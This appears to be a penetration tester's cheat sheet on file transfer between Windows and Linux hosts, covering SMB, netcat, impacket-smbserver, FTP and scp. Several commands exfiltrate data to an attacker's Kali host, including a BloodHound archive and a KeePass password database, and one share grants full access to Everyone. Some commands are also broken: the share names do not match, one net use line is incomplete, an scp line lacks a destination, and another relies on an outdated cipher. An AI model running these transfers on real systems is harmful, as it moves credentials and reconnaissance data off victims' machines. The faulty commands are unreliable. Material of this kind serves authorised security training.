# File Transfer

## Windows <--> Windows&#x20;

### Using SMB

```powershell

# Step 1: On first machine, create a new SMB share with full access
New-SmbShare -Path 'C:\Users\offsec\exam\101\' -Name "share" -FullAccess Everyone

# on second machine
net use \\server_id

# now simply use copy command to share file accoess windows machine
copy 20240514105010_BloodHound.zip \\192.168.176.250\share2\20240514105010_BloodHound.zip


```

## Windows <-->  Linux

### Using NetCat

```bash
# On Kali Machine
nc -lvp 3333 > data.zip

# And on windows side: Don't run on Powershell. 
./nc.exe 192.168.49.95 3333 < C:/Users/Tom.Davies/20240524095202_BloodHound.zip
```

### Using SMB Server

<pre class="language-powershell"><code class="lang-powershell"><strong># On kali machine
</strong><strong>impacket-smbserver share $(pwd) -smb2support -username User -password Pass
</strong></code></pre>

<pre class="language-powershell"><code class="lang-powershell"><strong>#### on Windows machine
</strong><strong># use the share
</strong>net use \\\\10.2.19.86\\share /U:User Pass

# Simply copy the file into the share
xcopy .\\tools \\\\10.2.19.86\\share\\tools /S /E

copy .\\Database.kdbx \\\\192.168.45.199\\share\\Database.kdbx
</code></pre>

### Using FTP

```bash
##### In Kali Machine ####

# we'll use pyftpdlib library
pip3 install pyftpdlib

# start the ftp server
python -m pyftpdlib -p 21 --write

#### in windows Machine ####
 
# Connecting to FTP
ftp <Kali IP>

# login using anonymous creds# 
anonymous:

# uplaod file from windows cmd 
put <filename>
```



## Linux <--> Linux

### Using SCP

```bash
scp file.txt joe@192.168.123.216:

# local file to remote system
scp file.txt remote_username@10.10.10.10:/remote/directory

# Remote to local system
scp remote_username@10.10.10.10:/remote/file.txt /local/directory

# improving SCP performance using blowfish
scp -c blowfish remote_username@10.10.10.10:/remote/directory
```





